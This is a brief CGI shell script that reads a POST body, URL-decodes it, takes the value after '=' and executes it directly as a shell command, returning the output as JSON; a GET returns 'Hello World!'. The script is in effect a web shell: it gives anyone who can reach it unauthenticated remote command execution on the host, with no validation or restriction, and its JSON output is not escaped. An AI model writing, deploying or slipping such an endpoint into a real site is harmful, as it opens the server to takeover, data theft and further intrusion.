#!/bin/sh
urldecode() {
  local encoded="${*//+/ }"
  printf '%b' "${encoded//%/\\x}"
}

echo "Content-Type: application/json"
echo ""

if [ "$REQUEST_METHOD" = "POST" ]; then
    VAR=$(sed -n '1p')
    DECODED=$(urldecode "$VAR")
    cmdln=$(echo $DECODED | awk -F= '{print $2}')
    stdout=$($cmdln)
    printf '{"stdout": "%s"}' "$stdout"
else
    echo '{"stdout": "Hello World!"}'
fi